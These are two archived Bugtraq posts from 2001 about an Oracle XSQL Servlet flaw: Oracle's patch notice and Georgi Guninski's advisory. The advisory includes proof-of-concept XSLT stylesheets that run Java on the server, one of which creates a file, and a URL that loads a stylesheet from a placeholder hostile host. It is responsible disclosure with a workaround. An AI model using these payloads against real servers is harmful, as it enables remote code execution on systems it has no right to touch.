=== Content from marc.info_62e3031a_20250125_202639.html ===

```
[[prev in list](?l=bugtraq&m=98027982200806&w=2)] [[next in list](?l=bugtraq&m=98028741321585&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Patch for Potential Vulnerability in Oracle XSQL Servlet
From:       [Oracle Security Alerts <secalert_us () ORACLE ! COM>](?a=98027703400003&r=1&w=2)
Date:       [2001-01-23 9:41:10](?l=bugtraq&r=1&w=2&b=200101)
[Download RAW [message](?l=bugtraq&m=98027700625521&q=mbox) or [body](?l=bugtraq&m=98027700625521&q=raw)]

Patch for Potential Vulnerability in Oracle XSQL Servlet

Description:
A potential security vulnerability in Oracle XSQL Servlet has been
discovered when using stylesheets as URL parameters which permits the
execution of arbitrary Java code on the Oracle 8.1.7.0.0 database server
with elevated privileges. This vulnerability was discovered in Oracle8i,
Release 8.1.7.0.0, Enterprise Edition running Oracle Internet
Application Server (iAS) and XSQL Servlet, Release 1.0.0.0, on MS
Windows 2000. It also exists in XSQL releases 1.0.1.0 to 1.0.3.0 on all
platforms.

Solution:
Oracle has corrected this vulnerability in the new release of XSQL
Servlet as well as provided more secure behavior by default. The new
release of XSQL Servlet, Release 1.0.4.0, can be obtained from Oracle
Technology Network, OTN, <http://otn.oracle.com/tech/xml/xsql_servlet>. A
patch will also be available in the upcoming Oracle8i, Release 8.1.7.1,
patch set and available for use with iAS Release 1.0.2.1.

Credits:
Oracle Corporation wishes to thank Georgi Guninski for discovering this
vulnerability and promptly bringing it to Oracle's attention.

[[prev in list](?l=bugtraq&m=98027982200806&w=2)] [[next in list](?l=bugtraq&m=98028741321585&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_8daf1d1a_20250125_202639.html ===

```
[[prev in list](?l=bugtraq&m=97906117926562&w=2)] [[next in list](?l=bugtraq&m=97906789217114&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Oracle XSQL servlet and xml-stylesheet allow executing java on
From:       [Georgi Guninski <guninski () GUNINSKI ! COM>](?a=96929514600006&r=1&w=2)
Date:       [2001-01-09 15:16:29](?l=bugtraq&r=1&w=2&b=200101)
[Download RAW [message](?l=bugtraq&m=97906670012796&q=mbox) or [body](?l=bugtraq&m=97906670012796&q=raw)]

Georgi Guninski security advisory #34, 2001

Oracle XSQL servlet and xml-stylesheet allow executing java on the web server

Systems affected:
Oracle XSQL servlet, installed by default Oracle 8.1.7 Windows 2000installation,
probably other versions/platforms are affected because the servlet is written in java

Risk: High
Date: 9 January 2001

Legal Notice:
This Advisory is Copyright (c) 2000 Georgi Guninski. You may distribute it \
unmodified. You may not modify it and distribute it or distribute parts of it without \
the author's written permission.

Disclaimer:
The opinions expressed in this advisory and program are my own and not of any \
company. The usual standard disclaimer applies, especially the fact that Georgi \
Guninski is not liable for any damages caused by direct or  indirect use of the \
information or functionality provided by this advisory or program.
Georgi Guninski bears no responsibility for content or misuse of this advisory or \
program or any derivatives thereof.

Description:
To get an idea for the XSQL servlet I suggest reading:
<http://technet.oracle.com/tech/xml/xsql_servlet/htdocs/relnotes.htm>
The XSQL servlet allows specifying external xslt stylesheets which may reside \
anywhere. The problem is it is possible to execute java on the web server in the xslt \
stylesheet. Executing java on the web server may lead to compromising it.

Details:

Oracle allows extensions to the built in xslt functions using the xmlns
"<http://www.oracle.com/XSL/Transform/java/>".
Using this namespace it is possible to instantiate java objects and execute their \
methods.

Sample xslt stylesheets:
--ora.xsl---string function, almost no effect---------------
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>" \
xmlns:jstr="<http://www.oracle.com/XSL/Transform/java/java.lang.String>" version="1.0"> \
<xsl:template match="/"> <html>
<h2>
Written by <A HREF="<http://www.guninski.com>">Georgi Guninski</A>
<BR>
</BR>
Java demo.
<xsl:variable name="str1" select="jstr:new('java on the server')" />
<xsl:value-of select="jstr:toUpperCase($str1)" />
</h2>
</html>
</xsl:template>
</xsl:stylesheet>
------------------------------------------------------------

--ora2.xsl----creates a file -------------------------------
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>" \
xmlns:jstr="<http://www.oracle.com/XSL/Transform/java/java.io.File>" version="1.0"> \
<xsl:template match="/"> <html>
<h2>
Written by <A HREF="<http://www.guninski.com>">Georgi Guninski</A>
<BR>
</BR>
File "c:\winnt\georgigjava" created=
<xsl:variable name="r1" select="jstr:new('c:\\winnt\\georgigjava')" />
<xsl:value-of select="jstr:createNewFile($r1)" />
</h2>
</html>
</xsl:template>
</xsl:stylesheet>
-----------------------------------------------------------

Assuming that <http://XSQL-SERVER/EXISTING.xsql> exists and is configured (there are \
                installed
.xsql demos in /xsql/java/demo/), the following URL:
----------------------------------------------------------------------
<http://XSQL-SERVER/EXISTING.xsql?xml-stylesheet=http://HOSTILE/ora.xsl>
----------------------------------------------------------------------
will execute java from <http://HOSTILE/ora.xsl> (see example stylesheets above) on \
XSQL-SERVER.

This work on default Oracle 8.1.7 install, I only needed to adjust the database name \
in the servlet config file.

Workaround:
Add 'allow-client-style="no"' on the document element of every xsql page.
I think this should be the default behavior.

Vendor status:
Oracle was contacted on 4 January 2001.
They responded very promptly and shall issue a patch "over the next few days".

Regards,
Georgi Guninski
<http://www.guninski.com>

[[prev in list](?l=bugtraq&m=97906117926562&w=2)] [[next in list](?l=bugtraq&m=97906789217114&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


